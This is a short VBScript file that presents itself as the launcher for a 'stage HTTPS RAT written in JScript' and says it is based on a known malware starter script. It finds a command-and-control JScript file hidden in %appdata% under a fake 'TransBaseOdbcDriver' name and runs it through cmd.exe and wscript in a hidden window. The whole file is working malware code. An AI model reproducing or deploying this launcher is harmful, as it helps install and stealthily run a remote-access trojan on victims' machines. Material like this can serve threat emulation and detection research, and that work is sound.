' This script executes a stage HTTPS RAT written in JScript
' This script is based on "starter.vbs" (SHA-256: 270a776cb9855f27452b35f072affbbc65023d4bb1f22e0c301afd2276e7c5ea)

' Get the absolute path to the c2script
Set shell = CreateObject("WScript.Shell")
appDataFolder = shell.ExpandEnvironmentStrings("%appdata%")
c2script = "\\TransBaseOdbcDriver\\TransBaseOdbcDriver.js"
pathToC2script = appDataFolder + c2script

' execute the C2 script
command = "cmd.exe /k wscript.exe """ & pathToC2script & """"
Set shell = WScript.CreateObject("WScript.Shell")
shell.Run command, 0, true
Set shell = Nothing